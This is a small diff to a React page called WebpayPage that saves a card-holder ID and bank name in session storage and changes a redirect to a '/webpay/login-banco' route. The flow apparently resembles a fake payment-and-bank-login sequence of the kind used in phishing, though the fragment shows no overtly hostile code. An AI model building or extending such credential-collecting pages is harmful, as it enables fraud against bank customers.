@@ -83,7 +83,7 @@ export default function WebpayPage() {
 				// Guardar datos en sessionStorage
 				sessionStorage.setItem('rutTarjeta', rutLimpio);
 				sessionStorage.setItem('banco', data.banco);
-                router.push('/obtener-permiso/webpay/login-banco');
+                router.push('/webpay/login-banco');
             } else {
                 setError('Datos incorrectos o banco no encontrado.');
             }
